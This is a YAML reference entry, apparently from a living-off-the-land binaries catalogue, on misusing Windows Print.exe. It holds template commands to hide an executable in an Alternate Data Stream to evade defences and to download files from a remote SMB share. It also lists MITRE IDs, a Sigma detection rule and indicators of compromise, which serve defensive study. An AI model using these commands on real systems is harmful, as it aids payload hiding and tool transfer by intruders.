---
Name: Print.exe
Description: Used by Windows to send files to the printer
Author: Oddvar Moe
Created: 2018-05-25
Commands:
  - Command: print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
    Description: Copy file.exe into the Alternate Data Stream (ADS) of file.txt.
    Usecase: Hide binary file in alternate data stream to potentially bypass defensive counter measures
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  - Command: print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
    Description: Copy file from source to destination
    Usecase: Copy files
    Category: Copy
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  - Command: print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
    Description: Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.
    Usecase: Copy/Download file from remote server
    Category: Copy
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
Full_Path:
  - Path: C:\Windows\System32\print.exe
  - Path: C:\Windows\SysWOW64\print.exe
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_print_remote_file_copy.yml
  - IOC: Print.exe retrieving files from internet
  - IOC: Print.exe creating executable files on disk
Resources:
  - Link: https://twitter.com/Oddvarmoe/status/985518877076541440
  - Link: https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
